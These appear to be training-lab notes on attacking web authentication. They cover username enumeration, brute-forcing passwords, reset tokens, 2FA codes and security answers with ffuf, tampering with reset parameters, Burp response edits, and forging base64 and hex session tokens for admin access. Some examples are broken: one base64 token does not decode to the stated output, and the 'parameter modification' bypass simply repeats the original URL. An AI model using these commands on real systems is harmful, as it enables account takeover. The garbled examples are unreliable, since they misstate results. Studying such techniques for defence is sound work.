# Authentication Types

Three Main Authentication Factor Types:

- Knowledge — something you know (e.g., password, PIN, security question).
- Ownership — something you have (e.g., ID card, security token, authenticator app).
- Inherence — something you are (e.g., fingerprint, face, voice).

# Brute Forcing 

**What is User Enumeration?**

User enumeration happens when a web app reveals whether a username exists based on different responses for valid and invalid usernames. This often happens during login, registration, or password reset processes.

Although usernames might seem harmless, they can be sensitive because they’re often the primary identifier for authentication. Attackers can gather valid usernames from one service (like a web app) and use them to target other services (FTP, SSH, RDP, etc.) on the same network.

**Why Does This Happen?**

Web developers sometimes reveal different error messages for invalid vs. valid usernames to help legit users correct mistakes. However, this behavior unintentionally helps attackers confirm which usernames are valid.

Example: WordPress login

- Invalid username → Error: “Unknown username. Check again or try your email address.”
- Valid username + wrong password → Error: “The password you entered for the username editor is incorrect.”

Such differences make it easy to enumerate users.

**When is User Enumeration a Feature?**

Some apps, like chat platforms, allow searching users by username. While this can help legitimate users find others, it also allows attackers to enumerate usernames.
Still, user enumeration should be minimized when possible — for example, by requiring login with an email instead of a username.

**How to Enumerate Users: Using Error Messages**

Attackers need a username list (wordlist) to test against login forms. Usernames are usually simpler than passwords, with fewer special characters. Common sources include public info, social media, company websites, or wordlists like SecLists.

**Example with ffuf (fuzzing tool):**

You try logging in with usernames from a wordlist and observe server responses. For invalid users, the server might say “Unknown user.” For valid users, you get a different error like “Invalid credentials.”
By filtering out responses containing “Unknown user,” you get a list of valid usernames.


`ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://<SERVER_IP>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"`

Result: You find valid usernames, like consuelo, to attack further.

# Brute-Forcing Passwords

After identifying valid users, the next authentication barrier is the password. Since many users pick easy-to-remember or reused passwords, attackers can often guess or brute-force them to gain access.

**Password Policies Matter**

Successful brute-forcing depends on how many guesses you can make and how fast you can try them. A good, targeted wordlist is key.
If the target app enforces a password policy, your wordlist should only contain passwords that comply. Otherwise, you waste time trying passwords the system would reject anyway.

**Example: Filtering a Wordlist to Match a Password Policy**

Suppose the login page says:

Password must have at least one uppercase letter, one lowercase letter, one digit, and be at least 10 characters long.

The popular `rockyou.txt` wordlist contains over 14 million passwords:

`wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt`

**Output: 14344391**

We can filter this list to passwords that match the policy using grep:

`grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10,}' > custom_wordlist.txt`
`wc -l custom_wordlist.txt`

**Output: ~151647 passwords**

This reduces the wordlist by about 99%, saving time during the attack.

# Brute-Forcing Password Reset Tokens


Many web applications offer a password recovery feature that uses a one-time reset token sent to the user via email or SMS. 
This token lets the user authenticate temporarily to reset their password.
If these reset tokens are weak or predictable, attackers can brute-force them to hijack accounts.

**Typical Password Reset Flow:**

- User forgets password and requests a reset
- Application generates a reset token and sends it (via email or SMS)
- User presents the token to verify identity
- User sets a new password
- User gains access with the new password

**Identifying Weak Tokens**

To find weak tokens, create an account on the target app, request a password reset, and analyze the received token.

For example, a password reset email might look like this:

<pre>Hello,

We received a request to reset your password. Use the link below to reset it:

http://weak_reset.htb/reset_password.php?token=7351

This link expires in 24 hours. If you did not request this, ignore this email.

Thank you.</pre>
  
Here, the reset token 7351 is only 4 digits long. This means there are only 10,000 possible tokens (0000 to 9999). An attacker can brute-force all possible tokens to hijack accounts.

**Attacking Weak Reset Tokens**

We will brute-force the reset token using ffuf. First, generate a wordlist of all 4-digit tokens:

`seq -w 0 9999 > tokens.txt`

The -w flag zero-pads numbers, ensuring all tokens have 4 digits.

Verify with:

`head tokens.txt`

Output:

<pre>0000
0001
0002
...
0009
</pre>

**Brute-Forcing with ffuf**

`ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"`

# Attacking 2FA

The account is protected with 2FA, prompting for a 4-digit one-time password after login:

<pre>http://<SERVER_IP>:<PORT>/2fa.php
Welcome admin. Please provide your 4-digit One-Time Password (OTP).</PORT>
</pre>

Since the 2FA code is only 4 digits long, there are 10,000 possible combinations (0000 to 9999), which can be brute-forced.
To brute-force all 4-digit OTPs, generate a wordlist of all possible codes

`seq -w 0 9999 > tokens.txt`

The -w flag zero-pads numbers to maintain a consistent 4-digit length.

**Running the Brute-Force with ffuf**

`ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"`

**Accessing the Protected Resource**

With the session marked authenticated, you can now access protected areas like the admin dashboard by visiting:

`http://<SERVER_IP>:<PORT>/admin.php`

Here, you will find that the 2FA challenge is bypassed, granting full access to the account.


# Vulnerable Password Reset

Many web apps authenticate users who forgot their password by asking security questions. Often, these questions are predefined and generic, not user-customizable. This means all users face the same questions, which attackers can exploit.

Typical questions might be:

- "What is your mother’s maiden name?"
- "What city were you born in?"

Although these questions seem personal, answers can often be guessed or gathered via OSINT. If the application lacks brute-force protections, attackers can try many answers.

**Assume the app asks:**

`http://<SERVER_IP>:<PORT>/security_question.php`

`Question: What city were you born in?` 
`[Response field] [Submit button]`

To brute-force this, use a wordlist of city names. A popular resource is a CSV file listing over 25,000 cities worldwide with more than 15,000 inhabitants.

**Targeting a Specific User:**

First, enter the username you want to attack:

`http://<SERVER_IP>:<PORT>/reset.php`
`Enter your username: [input field]`

For example, target the user admin. After submitting the username, you must answer the security question.

`cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt`
`wc -l city_wordlist.txt`

# Output: 26468 city_wordlist.txt

The HTTP request for answering looks like:

`POST /security_question.php`
`security_response=test`

The server replies with “Incorrect response.” for wrong answers.

**Using ffuf to Brute-Force the Security Answer:**

`ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."`


**Narrowing the Wordlist**

If you have additional info, e.g., the user is from Germany, reduce the wordlist accordingly:

`cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt`
`wc -l german_cities.txt`

# Output: 1117 german_cities.txt

This reduces brute-force time significantly.

**Manipulating the Reset Request**

Another common flaw is when the password reset process relies on hidden parameters, such as username fields, that can be tampered with.

Submit username on /reset.php:

<pre>POST /reset.php  
username=htb-stdnt</pre>

Answer security question on /security_question.php:

<pre>POST /security_question.php  
security_response=London&username=htb-stdnt</pre>

Reset password on /reset_password.php:

<pre>POST /reset_password.php  
password=P@$$w0rd&username=htb-stdnt</pre>

If the app fails to properly verify that the username in all steps matches, you can manipulate the username in the final step to reset another user’s password.

For example, changing the password for admin:

<pre>POST /reset_password.php  
password=P@$$w0rd&username=admin</pre>

# Direct Access Explained

The simplest way to bypass authentication is to request a protected resource directly without authenticating first. If the web application fails to verify that the request is from an authenticated user, an attacker can access sensitive information without logging in.

**Typical Vulnerable PHP Code**

Consider this PHP snippet intended to check user authentication:


<pre>if (!$_SESSION['active']) {
    header("Location: index.php");
}</pre>

Here, if the session variable active is not set (meaning the user is not authenticated), the script issues a redirect to index.php.

However, the script does not stop execution after the redirect. This means the rest of the page content (the protected data) is still sent in the HTTP response body.

**What Happens in Practice?**

When you send a request:

`GET /admin.php`

The server responds with a `302 Found` status, redirecting to the login page (index.php). The response body contains the full admin page content.

Browsers automatically follow this redirect and show the login page, so the admin content is never displayed. But the protected content is still in the response.

**How to Exploit This**

Using a tool like Burp Suite, you can intercept the server’s response and modify the status code from:

`302 Found to 200 OK`

Steps:

- Enable Intercept in Burp Suite.
- Navigate to /admin.php in your browser.
- Burp intercepts the response.
- Change the HTTP status code in the response from 302 to 200.
- Forward the modified response.

Now, your browser will render the admin page because it believes the request succeeded, revealing sensitive admin data without authentication.

**Visual Outcome**

Accessing:

`http://<SERVER_IP>:<PORT>/admin.php`

now shows the admin dashboard with statistics, posts, comments, and user info — all without logging in.

# How Parameter Modification Can Lead to Bypass

Consider our target web application. We have valid credentials for the user htb-stdnt. After logging in successfully, we are redirected to:

`/admin.php?user_id=183`

The login request and response:

<pre>POST /index.php
username=htb-stdnt
password=AcademyStudent%21

Response: 302 Found, redirects to /admin.php?user_id=183
Observing Privilege Limitations</pre>

On the `/admin.php` page, we see limited data and an error message:

<pre>Dashboard showing statistics: 283,000 monthly visitors, 105 blog posts, 1,200 comments, 350 users.
Error: "Could not load admin data. Please check your privileges."
This suggests our user lacks full admin privileges.</pre>

**Testing the Role of user_id Parameter**

If we remove the user_id parameter from the URL and request /admin.php without it, we get redirected back to the login page:

<pre>GET /admin.php
Cookie: PHPSESSID=valid_session

Response: 302 Found, redirects to /index.php</pre>

Even though our session cookie is still valid, the lack of the user_id parameter causes redirection. This indicates the application uses user_id as part of its authentication or authorization logic.

**Bypassing Authentication**

Since the app trusts the user_id parameter, we can bypass authentication or privilege checks by directly accessing:

`/admin.php?user_id=183`

This request returns:

`Response: 200 OK`

and the protected admin page loads successfully.

# Attacking Session Tokens

Authentication vulnerabilities can also arise from how web applications handle session tokens, not just from flawed login implementations. Session tokens are unique identifiers assigned to a user’s session. If an attacker obtains a valid session token for another user, they can impersonate that user and take over their session.

**Brute-Forcing Session Tokens**

If session tokens are not sufficiently random or are cryptographically weak, attackers can brute-force them, much like brute-forcing password reset tokens.

For example, a web application might assign a very short session token:

`Set-Cookie: session=a5fd`

A four-character token like this is trivial to brute-force, enabling attackers to enumerate all valid session tokens and hijack active sessions.

**Partially Predictable Session Tokens**

Sometimes session tokens are long but mostly static, with only a few random characters.

Example captured tokens:

`2c0c58b27c71a2ec5bf2b4b6e892b9f9`
`2c0c58b27c71a2ec5bf2b4546092b9f9`
`2c0c58b27c71a2ec5bf2b497f592b9f9`
`2c0c58b27c71a2ec5bf2b48bcf92b9f9`
`2c0c58b27c71a2ec5bf2b4735e92b9f9`
Here, 28 of 32 characters are identical across tokens, leaving only 4 characters dynamic. This drastically reduces the token entropy and makes brute-forcing feasible.

**Incrementing Session Tokens**

Another common weak token is an incrementing numeric session ID:

`141233`
`141234`
`141237`
`141238`
`141240`

Since these tokens increment predictably, attackers can simply guess or iterate session tokens to hijack other users’ sessions.

**Importance of Analyzing Multiple Tokens**

To assess session token security, capture multiple tokens and check for patterns or insufficient randomness. Tokens must have enough entropy to prevent brute-force enumeration.

**Attacking Predictable Session Tokens**

Even tokens that appear random might be predictable if the generation logic is flawed.

For instance, a session token might be a base64-encoded string containing user data:

`Set-Cookie: session=dXNlcjIodGltc3Rkbnq7cm9sZT11c2Vy`

Decoding it:

`echo -n dXNlcjIodGltc3Rkbnq7cm9sZT11c2Vy | base64 -d`

**Output: user=htb-stdnt;role=user**

Since the token encodes plaintext user info without protection, an attacker can forge a token with elevated privileges by encoding:

`echo -n 'user=htb-stdnt;role=admin' | base64`

**Output: dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==**

Sending this forged token grants administrative access.

**Other Encodings**

Look out for session tokens encoded in:

Hexadecimal:

`Set-Cookie: session=757365723d6874622d7374646e743b726f6c653d75736572`

Decoded with:

`echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p`

**Output: user=htb-stdnt;role=user**

URL encoding or other simple encodings might also reveal tamperable data.

**Weak Encryption in Session Tokens**

Some tokens result from encrypting data sequences. If weak algorithms or improper encryption are used, attackers might forge tokens or escalate privileges.

However, these attacks often require deeper knowledge of the encryption method or source code access and are harder to perform blindly.

